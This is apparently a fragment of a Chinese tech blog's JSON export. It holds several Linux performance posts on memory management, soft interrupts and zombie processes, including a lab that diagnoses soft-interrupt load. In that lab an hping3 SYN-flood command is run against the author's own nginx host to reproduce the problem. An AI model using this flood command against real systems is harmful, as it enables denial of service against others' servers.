并不是以字节为单位来管理内存，而是规定了一个内存映射的最小单位，也就是页，通常是4KB大小，这样，每一次内存映射，都需要关联 4KB或者4KB 整数倍的内存空间。 页的大小只有4KB，因此导致整个页表会变得非常大。一个32位系统就需要100多万个页表项，才能实现整个地址空间的映射，为了解决这个问题，Linux 提供了多级页表和大页。 什么是多级页表多级页表就是把内存分为区块来管理，将原来的映射关系改成区块索引和区块内的偏移。由于虚拟内存空间通常只用了很少一部分。那么多级页表就只保存这些使用中的取款，这样就可以大大减少列表的项数。 Linux 用的正是四级页表来管理内存页，虚拟地址被分为五个部分，前四个表项用于选择页，最后一个索引表是页内偏移。 什么是大页大页就是比普通页更大的内存块。常见的有2MB以及1GB。大页通常在使用大量内存的进程上，比如oracle、DPDK等。 通过这些机制，在页表的映射下。进程就可以通过虚拟地址来访问物理内存了。 虚拟内存空间分布下图，最上方的是内核空间，下方是用户空间。用户空间其实又被分成了多个不同的段。 通过上面这张图，你可以看到用户空间内存从低到高分别分成五个不同的内存块： 只读段，包括代码和常量。 数据段，包括全局变量。 堆，包括动态内存的分配、从低地址开始向上增长。 文件映射段，包括动态库、共享内存等，从高地震向下增长。 栈，包括局部变量和函数调用的上下文等。栈一般大小是固定的，一般是 8MB。 堆和文件映射段的内存是动态分配的。 内存如何分配和回收malloc()是C标准库提供的内存分配函数，对应到系统调用上，有两种实现方式，即brk()和mmap()。 对小块内存(小于128K)，C标准库使用brk() 来分配，也就是通过移动堆顶的位置来分配内存。这些内存释放后并不会立刻归还系统，而是被缓存起来，这样就可以重复使用。 而大块内存(大于128K)，则直接使用内存映射mmap()来分配，也就是在文件映射段找一块空闲内存分配出去。 这两种方式，自然各有优缺点。 brk()方式的缓存，可以减少缺页异常的发生，提高内存访问效率。不过，由于这些内存没有归还系统，在内存工作繁忙时，频繁的内存分配和释放会造成内存碎片。 而mmap()方式分配的内存，会在释放时直接归还系统，所以每次mmap都会发生缺页异常。在内存工作繁忙时，频繁的内存分配会导致大量的缺页异常，使内核的管理负担增大。这也是malloc只对大块内存使用mmap的原因。 当这两种调用发生后，其实并没有真正分配内存。这些内存，都只在首次访问时才分配，也就是通过缺页异常进入内核中，再由内核来分配内存。 整体来说，Linux 使用伙伴系统来管理内存分配。这些内存在MMU中以页为单位进行管理，伙伴系统也一样，以页为单位来管理内存，并且会通过相邻页的合并，减少内存碎片化(比如brk方式造成的内存碎片)。 你可能会想到一个问题，如果遇到比页更小的对象，比如不到1K的时候，该怎么分配内存呢? 在用户空间，malloc 通过brk()分配的内存，在释放时并不立即归还系统，而是缓存起来重复利用。在内核空间，Linux 则通过slab分配器来管理小内存。你可以把slab看成构建在伙伴系统_上的一个缓存，主要作用就是分配并释放内核中的小对象。 对内存来说，如果只分配而不释放，就会造成内存泄漏，甚至会耗尽系统内存。所以，在应用程序用完内存后，还需要调用free() 或unmap()，来释放这些不用的内存。 当然，系统也不会任由某个进程用完所有内存。在发现内存紧张时，系统就会通过一系列机制来回收内存，比如下面这三种方式: 回收缓存，比如使用L RU (Least Recently Used) 算法，回收最近使用最少的内存页面; 回收不常访问的内存，把不常用的内存通过交换分区直接写到磁盘中; 杀死进程，内存紧张时系统还会通过00M (Out of Memory)，直接杀掉占用大量内存的进程。 其中，第二种方式回收不常访问的内存时，会用到交换分区(以下简称Swap)。Swap其实就是把一块磁盘空间当成内存来用。它可以把进程暂时不用的数据存储到磁盘中(这个过程称为换出)，当进程访问这些内存时，再从磁盘读取这些数据到内存中(这个过程称为换入)。 所以，你可以发现，Swap把系统的可用内存变大了。不过要注意，通常只在内存不足时，才会发生Swap交换。并且由于磁盘读写的速度远比内存慢，Swap 会导致严重的内存性能问题。 第三种方式提到的OOM (Out of Memory)，其实是内核的- -种保护机制。它监控进程的内存使用情况，并且使用oom_ score 为每个进程的内存使用情况进行评分: 一个进程消耗的内存越大，oom_ score就越大; 一个进程运行占用的CPU越多，oom_ score就越小。 这样，进程的oom_ score 越大，代表消耗的内存越多，也就越容易被00M杀死，从而可以更好保护系统。 当然，为了实际工作的需要，管理员可以通过/proc文件系统，手动设置进程的oom_ adj ，从而调整进程的oom_ score。 oom_ adj 的范围是[-17, 15]，数值越大，表示进程越容易被00M杀死;数值越小，表示进程越不容易被OOM杀死，其中-17表示禁止0OM。 比如用下面的命令，你就可以把sshd进程的oom_ adj 调小为-16,这样，sshd 进程就不容易被OOM杀死。 1echo -16 &gt; &#x2F;proc&#x2F;$(pidof sshd)&#x2F;oom_adj 如何查看内存使用情况1234# free total used free shared buff&#x2F;cache availableMem: 1008936 113468 646612 748 248856 746168Swap: 0 0 0 你可以看到，free 输出的是一个表格，其中的数值都默认以字节为单位。表格总共有两行六列，这两行分别是物理内存Mem和交换分区Swap的使用情况，而六列中，每列数据的含义分别为: 第一列，total是总内存大小; 第二列，used是已使用内存的大小，包含了共享内存; 第三列，free是未使用内存的大小; 第四列，shared是共享内存的大小; 第五列，buff/cache是缓存和缓冲区的大小; 最后一列，available是新进程可用内存的大小。 注意一下，最后一列的可用内存available。available 不仅包含未使用内存，还包括了可回收的缓存，所以一般会比未使用内存更大。不过，并不是所有缓存都可以回收，因为有些缓存可能正在使用中。 top 按下M 查看内存排序 跟内存相关的几列数据，比如VIRT、RES、SHR以及%MEM等，这进程最重要的几个内存使用情况: VIRT是进程虚拟内存的大小，只要是进程申请过的内存，即便还没有真正分配物理内存，也会计算在内。 RES是常驻内存的大小，也就是进程实际使用的物理内存大小，但不包括Swap和共享内存。 SHR是共享内存的大小，比如与其他进程共同使用的共享内存、加载的动态链接库以及程序的代码段等。 %MEM是进程使用物理内存占系统总内存的百分比。 使用top 查看内存需要注意: 虚拟内存通常并不会全部分配给物理内存 共享内存 SHR 并不一定是共享，例如程序的代码段、非共享的动态链接库，也都算在 SHR 里。当然，SHR 也包括了进程间真正共享的内存。所以在计算多个进程的内存使用时，不要把所有进程的 SHR 直接相加得出结果。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"使用hping3 发送小包分析软中断导致的系统CPU使用率高问题","slug":"使用hping3-发送小包分析软中断导致的系统CPU使用率高问题","date":"2019-03-27T07:12:14.000Z","updated":"2021-02-26T06:05:29.309Z","comments":true,"path":"posts/12651.html","link":"","permalink":"https://awen.me/posts/12651.html","excerpt":"准备工具2台机器 A 机器192.168.10.55 安装： docker sysstat sar tcpdump B 机器 安装 hping3","text":"准备工具2台机器 A 机器192.168.10.55 安装： docker sysstat sar tcpdump B 机器 安装 hping3 在A机器执行以下命令，运行nginx 1docker run -itd --name&#x3D;nginx -p 80:80 nginx 在B 机器执行 1234567891011121314151617181920212223242526# curl http:&#x2F;&#x2F;192.168.10.55&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;&#x2F;title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;&#x2F;h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;&#x2F;p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.org&#x2F;&quot;&gt;nginx.org&lt;&#x2F;a&gt;.&lt;br&#x2F;&gt;Commercial support is available at&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.com&#x2F;&quot;&gt;nginx.com&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 在B机器继续执行以下命令 模拟 SYN FLOOD 攻击。 1# hping3 -S -p 80 -i u100 192.168.10.55 参数说明 -S 表示设置 TCP 协议的 SYN -p 表示目标端口为80 -i u100 表示每隔 100 微妙发送一个网络帧 在 A 机器执行top 观察 平均负载全是 0，就绪队列里面只有一个进程（1 running）。 每个 CPU 的使用率都挺低，最高的 CPU1 的使用率也只有 4.4%，并不算高。 再看进程列表CPU 使用率最高的进程也只有 0.3%，还是不高呀。 查看 /proc/softirqs1watch -d &quot;&#x2F;bin&#x2F;cat &#x2F;proc&#x2F;softirqs | &#x2F;usr&#x2F;bin&#x2F;awk &#39;NR &#x3D;&#x3D; 1&#123;printf \\&quot;%-15s %-15s %-15s %-15s %-15s\\n\\&quot;,\\&quot; \\&quot;,\\$1,\\$2,\\$3,\\$4&#125;; NR &gt; 1&#123;printf \\&quot;%-15s %-15s %-15s %-15s %-15s\\n\\&quot;,\\$1,\\$2,\\$3,\\$4,\\$5&#125;&#39;&quot; 得到结果 12345678910111213Every 2.0s: &#x2F;bin&#x2F;cat &#x2F;proc&#x2F;softirqs | &#x2F;usr&#x2F;bin&#x2F;awk &#39;NR &#x3D;&#x3D; 1&#123;printf &quot;%-15s %-15s %-15s %-15s %-15s\\n&quot;,&quot; &quot;,$1,$2,$3,$4&#125;; NR &gt; 1&#123;printf &quot;%-15s %-15s %-15s %-15s %-15s\\n&quot;,$1,$2,$3,$4,$5&#125;&#39; linux: Wed Mar 27 15:36:34 2019 CPU0 CPU1 CPU2 CPU3HI: 0 0 0 0TIMER: 146284 312590 0 0NET_TX: 7 1 0 0NET_RX: 34 25056951 0 0BLOCK: 0 0 0 0IRQ_POLL: 0 0 0 0TASKLET: 11 13 0 0SCHED: 140342 306034 0 0HRTIMER: 0 0 0 0RCU: 152008 271203 0 0 通过 /proc/softirqs 文件内容的变化情况，你可以发现， TIMER（定时中断）、NET_RX（网络接收）、SCHED（内核调度）、RCU（RCU 锁）等这几个软中断都在不停变化。其中 NET_RX CPU1 上的变化最快。说明可能和网络收发数据包有关系，我们继续分析。 使用 sar 分析1234567891011121314151617181920root@linux:~# sar -n DEV 1 # -n DEV 表示显示网络收发的报告，间隔 1秒输出一组数据Linux 4.15.0-46-generic (linux) 03&#x2F;27&#x2F;2019 _x86_64_ (2 CPU)03:23:52 PM IFACE rxpck&#x2F;s txpck&#x2F;s rxkB&#x2F;s txkB&#x2F;s rxcmp&#x2F;s txcmp&#x2F;s rxmcst&#x2F;s %ifutil03:23:53 PM veth17e8b9b 12408.00 24817.00 702.80 1308.71 0.00 0.00 0.00 0.1103:23:53 PM docker0 12407.00 24816.00 533.11 1308.66 0.00 0.00 0.00 0.0003:23:53 PM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:23:53 PM eth0 24824.00 12415.00 1309.17 703.60 0.00 0.00 0.00 0.0003:23:53 PM IFACE rxpck&#x2F;s txpck&#x2F;s rxkB&#x2F;s txkB&#x2F;s rxcmp&#x2F;s txcmp&#x2F;s rxmcst&#x2F;s %ifutil03:23:54 PM veth17e8b9b 12234.00 24467.00 692.94 1290.25 0.00 0.00 0.00 0.1103:23:54 PM docker0 12234.00 24467.00 525.68 1290.25 0.00 0.00 0.00 0.0003:23:54 PM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:23:54 PM eth0 24509.00 12348.00 1292.95 705.29 0.00 0.00 0.00 0.0003:23:54 PM IFACE rxpck&#x2F;s txpck&#x2F;s rxkB&#x2F;s txkB&#x2F;s rxcmp&#x2F;s txcmp&#x2F;s rxmcst&#x2F;s %ifutil03:23:55 PM veth17e8b9b 12120.00 24238.00 686.48 1278.18 0.00 0.00 0.00 0.1003:23:55 PM docker0 12120.00 24239.00 520.78 1278.23 0.00 0.00 0.00 0.0003:23:55 PM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:23:55 PM eth0 24251.00 12131.00 1279.00 688.57 0.00 0.00 0.00 0.00 对于sar的输出界面，我先来简单介绍一下，从左往右依次是: 第一列:表示报告的时间。 第二列:IFACE表示网卡。 第三、四列: rxpck/s和txpck/s分别表示每秒接收、发送的网络帧数，也就是PPS。 第五、六列: rxkB/s和txkB/s分别表示每秒接收、发送的千字节数，也就是BPS。 后面的其他参数基本接近0，显然跟今天的问题没有直接关系，你可以先忽略掉。 我们看 eth0 美妙接收网络帧数较大，达到了24251 而发送的网络帧则比较小 ，每秒接收的千字节数只有1279，而发送的只有688.57 我们通过公式计算下 11279*1024&#x2F;24251 &#x3D; 54字节 说明平均每个网络帧只有 54 字节。这显然是很小的网络帧。也就是常说的小包问题 通过 tcpdump 抓包分析1# tcpdump -i eth0 -n tcp port 80 我们可以看到 源 IP 192.168.10.163 的996 端口向主机 192.168.10.55 80端口发送SYN。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"理解Linux 的软中断","slug":"理解Linux-的软中断","date":"2019-03-27T03:22:54.000Z","updated":"2021-02-26T06:05:29.347Z","comments":true,"path":"posts/5405.html","link":"","permalink":"https://awen.me/posts/5405.html","excerpt":"当进程处于长时间不可中断状态，就有可能出现系统异常。除了iowait 还有软中断也是常见的 CPU 使用率升高的问题之一。","text":"当进程处于长时间不可中断状态，就有可能出现系统异常。除了iowait 还有软中断也是常见的 CPU 使用率升高的问题之一。 什么是中断中断是系统用来响应硬件设备请求的一种机制，它会打断进程的正常调度和执行，然后调用内核中的中断处理程序来响应设备的请求。 软中断就比如说你订了一份外卖，但是不确定外卖什么时候送到，也没有别的方法了解外卖的进度，但是，配送员送外卖是不等人的，到了你这儿没人取的话，就直接走人了。所以你只能苦苦等着，时不时去门口看看外卖送到没，而不能干其他事情。 不过呢，如果在订外卖的时候，你就跟配送员约定好，让他送到后给你打个电话，那你就不用苦苦等待了，就可以去忙别的事情，直到电话一响，接电话、取外卖就可以了。 这里的“打电话”，其实就是一个中断。没接到电话的时候，你可以做其他的事情；只有接到了电话（也就是发生中断），你才要进行另一个动作：取外卖。 中断其实是一种异步的事件处理机制，可以提高系统的并发处理能力。 由于中断处理程序会打断其他进程的运行，所以，为了减少对正常进程运行调度的影响，中断处理程序就需要尽可能快地运行。如果中断本身要做的事情不多，那么处理起来也不会有太大问题；但如果中断要处理的事情很多，中断服务程序就有可能要运行很长时间。 中断处理程序在响应中断时，还会临时关闭中断。这就会导致上一次中断处理完成之前，其他中断都不能响应，也就是说中断有可能会丢失。 那么还是以取外卖为例。假如你订了 2 份外卖，一份主食和一份饮料，并且是由 2 个不同的配送员来配送。这次你不用时时等待着，两份外卖都约定了电话取外卖的方式。 但是，问题又来了。 当第一份外卖送到时，配送员给你打了个长长的电话，商量发票的处理方式。与此同时，第二个配送员也到了，也想给你打电话。 但是很明显，因为电话占线（也就是关闭了中断响应），第二个配送员的电话是打不通的。所以，第二个配送员很可能试几次后就走掉了（也就是丢失了一次中断) 什么是软中断Linux 中的软中断包括网络收发、定时、调度、RCU 锁等各种类型，可以通过查看 /proc/softirqs 来观察软中断的运行情况。 为了解决中断处理程序执行过长和中断丢失的问题，Linux 将中断处理过程分成了两个阶段，也就是上半部和下半部: 上半部用来快速处理中断， 它在中断禁止模式下运行，主要处理跟硬件紧密相关的或时间敏感的工作。 下半部用来延迟处理上半部未完成的工作，通常以内核线程的方式运行。 举个例子 网卡接收到数据包后，会通过硬件中断的方式，通知内核有新的数据到了。这时，内核就应该调用中断处理程序来响应它。你可以自己先想一下，这种情况下的上半部和下半部分别负责什么工作呢? 对.上半部来说，既然是快速处理，其实就是要把网卡的数据读到内存中，然后更新一下硬件寄存器的状态(表示数据已经读好了)，最后再发送一个软中断信号，通知下半部做进-步的处理。 而下半部被软中断信号唤醒后，需要从内存中找到网络数据，再按照网络协议栈，对数据进行逐层解析和处理，直到把它送给应用程序。 所以，这两个阶段你也可以这样理解: 上半部直接处理硬件请求，也就是我们常说的硬中断，特点是快速执行; 而下半部则是由内核触发，也就是我们常说的软中断，特点是延迟执行。 实际上，. 上半部会打断CPU正在执行的任务，然后立即执行中断处理程序。而下半部以内核线程的方式执行，并且每个CPU都对应一个软中断内核线程，名字为“ksoftirqd/CPU编号”，比如说，0号CPU对应的软中断内核线程的名字就是ksoftirqd/0。 不过要注意的是，软中断不只包括了刚刚所讲的硬件设备中断处理程序的下半部，一些内核自定义的事件也属于软中断，比如内核调度和 RCU 锁（Read-Copy Update 的缩写，RCU 是 Linux 内核中最常用的锁之一）等。 查看软中断和内核线程 /proc/softirqs 提供了软中断的运行情况 /proc/interrupts 提供了硬中断的运行情况。 查看/proc/ softirqs文件内容时，特别注意以下这两点。 第一，要注意软中断的类型，也就是这个界面中第- -列的内容。从第一列你可以看到， 软中断包括了10个类别，分别对应不同的工作类型。比如NET_ RX表示网络接收中断，而NET_TX表示网络发送中断。 第二，要注意同一种软中断在不同CPU上的分布情况，也就是同- -行的内容。正常情况下，同一种中断在不同CPU.上的累积次数应该差不多。比如这个界面中，NET_ _RX在CPU0和CPU1上的中断次数基本是同一个数量级，相差不大。 TASKLET 在不同CPU.上的分布并不均匀。TASKLET是最常用的软中断实现机制，每个TASKL ET只运行一次就会结束，并且只在调用它的函数所在的CPU上运行。 因此，使用TASKLET特别简便，当然也会存在一些问题，比如说由于只在一个CPU上运行导致的调度不均衡，再比如因为不能在多个CPU上并行运行带来了性能限制。 123456789101112root@linux:~# cat &#x2F;proc&#x2F;softirqs CPU0 CPU1HI: 0TIMER: 40969NET_TX: 5NET_RX: 25BLOCK: 0IRQ_POLL: 0TASKLET: 11SCHED: 33747HRTIMER: 0RCU: 43498 1234567891011121314151617181920212223242526272829303132333435363738394041424344root@linux:~# cat &#x2F;proc&#x2F;interrupts CPU0 CPU1 0: 2 0 IO-APIC 2-edge timer 1: 0 9 IO-APIC 1-edge i8042 4: 0 1949 IO-APIC 4-edge ttyS0 6: 3 0 IO-APIC 6-edge floppy 8: 1 0 IO-APIC 8-edge rtc0 9: 0 0 IO-APIC 9-fasteoi acpi 10: 0 0 IO-APIC 10-fasteoi virtio4 11: 0 32 IO-APIC 11-fasteoi uhci_hcd:usb1 12: 15 0 IO-APIC 12-edge i8042 14: 0 0 IO-APIC 14-edge ata_piix 15: 0 0 IO-APIC 15-edge ata_piix 24: 0 0 PCI-MSI 65536-edge virtio1-config 25: 9136 0 PCI-MSI 65537-edge virtio1-virtqueues 26: 0 0 PCI-MSI 81920-edge virtio2-config 27: 14546 0 PCI-MSI 81921-edge virtio2-req.0 28: 0 0 PCI-MSI 98304-edge virtio3-config 29: 129 0 PCI-MSI 98305-edge virtio3-req.0 30: 0 0 PCI-MSI 507904-edge virtio5-config 31: 42194 0 PCI-MSI 507905-edge virtio5-req.0 32: 0 0 PCI-MSI 49152-edge virtio0-config 33: 0 1465 PCI-MSI 49153-edge virtio0-input.0 34: 0 1 PCI-MSI 49154-edge virtio0-output.0NMI: 0 0 Non-maskable interruptsLOC: 88730 91706 Local timer interruptsSPU: 0 0 Spurious interruptsPMI: 0 0 Performance monitoring interruptsIWI: 0 0 IRQ work interruptsRTR: 0 0 APIC ICR read retriesRES: 61981 67365 Rescheduling interruptsCAL: 2877 28951 Function call interruptsTLB: 1198 594 TLB shootdownsTRM: 0 0 Thermal event interruptsTHR: 0 0 Threshold APIC interruptsDFR: 0 0 Deferred Error APIC interruptsMCE: 0 0 Machine check exceptionsMCP: 10 10 Machine check pollsHYP: 0 0 Hypervisor callback interruptsERR: 0MIS: 0PIN: 0 0 Posted-interrupt notification eventNPI: 0 0 Nested posted-interrupt eventPIW: 0 0 Posted-interrupt wakeup event 软中断实际上是以内核线程的方式运行的，每个CPU都对应一个软中断内核线程。可以通过以下命令查看，有中括号的一般都是内核线程。 123root@linux:~# ps aux | grep softirqroot 7 0.0 0.0 0 0 ? S 10:47 0:00 [ksoftirqd&#x2F;0]root 16 0.0 0.0 0 0 ? S 10:47 0:00 [ksoftirqd&#x2F;1]","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"系统出现大量不可中断进程和僵尸进程怎么办","slug":"系统出现大量不可中断进程和僵尸进程怎么办","date":"2019-03-27T01:16:23.000Z","updated":"2021-02-26T06:05:29.350Z","comments":true,"path":"posts/14974.html","link":"","permalink":"https://awen.me/posts/14974.html","excerpt":"当iowait 升高时，进程可能因为得不到硬件响应，而长时间处于不可中断状态，从ps或top命查看进程状态","text":"当iowait 升高时，进程可能因为得不到硬件响应，而长时间处于不可中断状态，从ps或top命查看进程状态 进程状态 R是Running或Runnable的缩写，表示进程在CPU的就绪队列中，正在运行或者正在等待运行。 D是Disk Sleep 的缩写，也就是不可中断状态睡眠(Uninterruptible Sleep)， 一般表示进程正在跟硬件交互，并且交互过程不允许被其他进程或中断打断。 Z是Zombie的缩写，、示僵尸进程，也就是进程实际.上已经结束了，但是父进程还没有回收它的资源(比如进程的描述符、PID等)。 S是Interruptible Sleep的缩写，也就是可中断状态睡眠，表示进程因为等待某个事件而被系统挂起。当进程等待的事件发生时，它会被唤醒并进入R状态。 I是Idle的缩写，也就是空闲状态，用在不可中断睡眠的内核线程上。前面说了，硬件交互导致的不可中断进程用D表示，但对某些内核线程来说，它们有可能实际上并没有任何负载，用Idle正是为了区分这种情况。要注意，D状态的进程会导致平均负载升高，1状态的进程却不会。 T 或 t 也就是 Stopped 或 Traced 的缩写，表示进程处于暂停或者跟踪状态。向一个进程发送 SIGSTOP 信号，它就会因响应这个信号变成暂停状态（Stopped）；再向它发送 SIGCONT 信号，进程又会恢复运行（如果进程是终端里直接启动的，则需要你用 fg 命令，恢复到前台运行）。 X 表示 Dead，不会再top或ps中看到 不可中断状态为了保证进程数据与硬件状态一致，正常情况下，不可中断状态在很短时间内就会结束。所以，短时的不可中断状态进程，我们一般可以忽略。 但如果系统或硬件发生了故障，进程可能会在不可中断状态保持很久，甚至导致系统中出现大量不可中断进程。这时，你就得注意下，系统是不是出现了I/O 等性能问题。 僵尸进程，是多进程应用很容易碰到的问题。正常情况下，当-一个进程创建了子进程后，它应该通过系统调用wait()或者waitpid()等待子进程结束，回收子进程的资源;而子进程在结束时，会向它的父进程发送SIGCHLD信号，所以，父进程还可以注册SIGCHL .D信号的处理函数，异步回收资源。 如果父进程没这么做，或是子进程执行太快，父进程还没来得及处理子进程状态，子进程就已经，提前退出，那这时的子进程就会变成僵尸进程。换句话说，父亲应该一直对儿子负责，善始善终，如果不作为或者跟不上，都会导致“问题少年”的出现。 通常，僵尸进程持续的时间都比较短，在父进程回收它的资源后就会消亡;或者在父进程退出后，由init进程回收后也会消亡。 一旦父进程没有处理子进程的终止，还一直保持运行状态，那么子进程就会一直处于僵尸状态。大量的僵尸进程会用尽 PID 进程号，导致新进程不能创建，所以这种情况一定要避免。 案例分析1.下载镜像 1docker run --privileged --name&#x3D;app -itd feisky&#x2F;app:iowait &#x2F;app -d &#x2F;dev&#x2F;vdc -s 67108864 -c 20 2.查看ps 1234567root@linux:~# ps aux | grep &#x2F;approot 9321 0.1 0.0 4512 760 pts&#x2F;0 Ss+ 10:16 0:00 &#x2F;app -d &#x2F;dev&#x2F;vdc -s 67108864 -c 20root 9361 0.5 0.8 70052 65832 pts&#x2F;0 D+ 10:16 0:00 &#x2F;app -d &#x2F;dev&#x2F;vdc -s 67108864 -c 20root 9362 0.5 0.8 70052 65832 pts&#x2F;0 D+ 10:16 0:00 &#x2F;app -d &#x2F;dev&#x2F;vdc -s 67108864 -c 20root 9379 0.7 0.8 70052 65832 pts&#x2F;0 D+ 10:16 0:00 &#x2F;app -d &#x2F;dev&#x2F;vdc -s 67108864 -c 20root 9380 0.7 0.8 70052 65832 pts&#x2F;0 D+ 10:16 0:00 &#x2F;app -d &#x2F;dev&#x2F;vdc -s 67108864 -c 20root 9382 0.0 0.0 15996 1052 pts&#x2F;0 S+ 10:16 0:00 grep --color&#x3D;auto &#x2F;app 从这个界面，我们可以发现多个app进程已经启动，并且它们的状态分别是Ss+和D+。其中，S表示可中断睡眠状态，D表示不可中断睡眠状态，我们在前面刚学过，那后面的s和+是什么意思呢?不知道也没关系，查一下man ps就可以。现在记住，s表示这个进程是一个会话的领导进程，而+表示前台进程组。 这里又出现了两个新概念，进程组和会话。它们用来管理-组相互关联的进程，意思其实很好理解。 进程组表示一组相互关联的进程，比如每个子进程都是父进程所在组的成员; 而会话是指共享同一个控制终端的一个或多个进程组。 比如，我们通过 SSH 登录服务器，就会打开一个控制终端（TTY），这个控制终端就对应一个会话。而我们在终端中运行的命令以及它们的子进程，就构成了一个个的进程组，其中，在后台运行的命令，构成后台进程组；在前台运行的命令，构成前台进程组。 3.观察top 123456789101112131415161718192021222324252627282930top - 10:22:38 up 19 min, 1 user, load average: 126.13, 66.90, 27.96Tasks: 243 total, 1 running, 186 sleeping, 0 stopped, 19 zombie%Cpu0 : 0.7 us, 27.5 sy, 0.0 ni, 0.0 id, 71.6 wa, 0.0 hi, 0.0 si, 0.3 st%Cpu1 : 0.3 us, 18.4 sy, 0.0 ni, 0.0 id, 80.6 wa, 0.0 hi, 0.3 si, 0.3 stKiB Mem : 8156288 total, 120128 free, 7989652 used, 46508 buff&#x2F;cacheKiB Swap: 0 total, 0 free, 0 used. 3892 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 41 root 20 0 0 0 0 S 20.6 0.0 0:04.66 kswapd0 5561 root 20 0 808712 17500 0 S 6.2 0.2 0:02.53 docker-containe 5538 root 20 0 1118256 35996 0 S 5.9 0.4 0:04.71 dockerd 9531 root 20 0 70052 55208 0 D 2.3 0.7 0:00.10 app 9477 root 20 0 70052 65504 0 D 1.6 0.8 0:00.10 app 9518 root 20 0 70052 63392 0 D 1.6 0.8 0:00.08 app 9290 root 20 0 9396 668 0 S 1.3 0.0 0:00.13 docker-containe 9400 root 20 0 70052 65504 0 D 1.3 0.8 0:00.12 app 9525 root 20 0 70052 57320 0 D 1.3 0.7 0:00.07 app 9542 root 20 0 70052 34876 0 D 1.3 0.4 0:00.06 app 256 root 19 -1 86664 4764 4076 S 0.7 0.1 0:00.55 systemd-journal 8 root 20 0 0 0 0 I 0.3 0.0 0:00.08 rcu_sched 25 root 20 0 0 0 0 S 0.3 0.0 0:00.01 oom_reaper 663 syslog 20 0 267268 1312 0 S 0.3 0.0 0:00.15 rsyslogd 1333 root 20 0 0 0 0 I 0.3 0.0 0:00.05 kworker&#x2F;1:5 9187 root 20 0 0 0 0 I 0.3 0.0 0:00.02 kworker&#x2F;0:0 9429 root 20 0 43440 796 0 R 0.3 0.0 0:01.44 top 9553 root 20 0 70052 32768 0 D 0.3 0.4 0:00.04 app 9560 root 20 0 70052 16400 0 D 0.3 0.2 0:00.01 app 9561 root 20 0 70052 18248 0 D 0.3 0.2 0:00.18 app 9564 root 20 0 70052 18248 0 D 0.3 0.2 0:00.01 app 1 root 20 0 159864 2468 4 S 0.0 0.0 0:02.70 systemd 发现1分钟负载已经到达126.13，而5分钟15分钟负载相对1分钟较低，但是也很高了，说明系统已经有了性能瓶颈。 tasks 这一栏 1个进程正在运行，186个睡眠，19个僵尸进程，且不断增多。 说明有子进程退出没有被清理。 在看cpu 用户cpu和系统cpu都不高，但是iowait 高达80.6 。 由此，可以很明确： iowait 太高，导致负载升高。 僵尸进程多，说明程序没有正确清理子进程资源。 如何解决1.dstat 观察CPU 和 I/O 使用情况。 1234567891011121314root@linux:~# dstat 1 10 # 1秒输出10组数据You did not select any stats, using -cdngy by default.--total-cpu-usage-- -dsk&#x2F;total- -net&#x2F;total- ---paging-- ---system--usr sys idl wai stl| read writ| recv send| in out | int csw 2 2 55 41 0| 48M 1252k| 0 0 | 0 0 | 491 922 0 2 0 98 0| 117M 0 | 132B 724B| 0 0 | 744 1349 0 1 0 98 0| 111M 0 | 66B 326B| 0 0 | 293 627 0 4 0 96 0| 134M 0 | 66B 342B| 0 0 |1246 1865 0 0 0 100 0| 109M 0 | 66B 342B| 0 0 | 360 746 0 2 0 98 0| 118M 200k| 66B 342B| 0 0 | 846 1471 0 1 0 99 0| 110M 0 | 132B 444B| 0 0 | 285 630 0 0 0 100 0| 108M 0 | 66B 350B| 0 0 | 258 616 0 1 0 99 0| 110M 0 | 66B 342B| 0 0 | 287 636 0 1 0 99 0| 110M 0 | 66B 342B| 0 0 | 283 675 发现每当iowait 升高 磁盘的读很大，那么到底是什么进程在读磁盘呢 我们从top 发现 僵尸进程很可疑， 1234569462 root 20 0 70052 65504 0 D 0.3 0.8 0:00.07 app 9490 root 20 0 70052 65504 0 D 0.3 0.8 0:00.07 app 9497 root 20 0 70052 65504 0 D 0.3 0.8 0:00.07 app 9503 root 20 0 70052 65504 0 D 0.3 0.8 0:00.07 app 9555 root 20 0 70052 65504 0 D 0.3 0.8 0:00.06 app 9557 root 20 0 70052 65504 0 D 0.3 0.8 0:00.18 app 使用pidstat 分析僵尸进程 12345678root@linux:~# pidstat -d -p 9431 1 3 # -d 展示I&#x2F;O 统计数据，-p 指定进程号 间隔1秒输出3组数据Linux 4.15.0-46-generic (linux) 03&#x2F;27&#x2F;2019 _x86_64_ (2 CPU)10:27:26 AM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command10:27:27 AM 0 9431 0.00 0.00 0.00 121 app10:27:28 AM 0 9431 0.00 0.00 0.00 89 app10:27:29 AM 0 9431 0.00 0.00 0.00 99 appAverage: 0 9431 0.00 0.00 0.00 103 app 在这个输出中， kB_rd 表示每秒读的 KB 数， kB_wr 表示每秒写的 KB 数，iodelay 表示 I/O 的延迟（单位是时钟周期）。它们都是 0，那就表示此时没有任何的读写，说明问题不是 9431 进程导致的。 同样的方法分析其他僵尸进程，发现也都没有异常。 我们查看所有进程的 I/O 发现 果然是app 在捣鬼。 1234567891011121314151617181920212223242526#pidstat -d 1 20 # 不指定进程号查看10:30:13 AM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command10:30:14 